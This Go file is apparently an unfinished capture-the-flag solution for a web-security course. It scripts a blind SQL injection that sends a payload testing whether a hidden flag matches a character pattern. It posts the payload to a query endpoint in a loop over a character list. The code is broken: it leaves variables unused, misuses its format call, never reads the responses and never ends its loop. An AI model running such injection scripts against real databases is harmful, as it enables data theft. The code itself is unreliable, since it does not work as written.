package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
)

func main() {
	fmt.Println("Hello world")
	list := [...]string{"{", "}", "-", "+", " ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
	var query string = "' and name like 'Ab%' and exists(select flag from flag where flag like '%COMP6843[1]%') --"
	var exist string = ""
	var found bool = false

	for {
		found = false
		for _, character := range list {
			resp, err := http.PostForm("http://slowpoke.ext.ns.agency/query", url.Values{"query": {fmt.Sprintf(query, list)}})
			if err != nil {
				fmt.Println("Error sending POST request")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
		}
	}
}
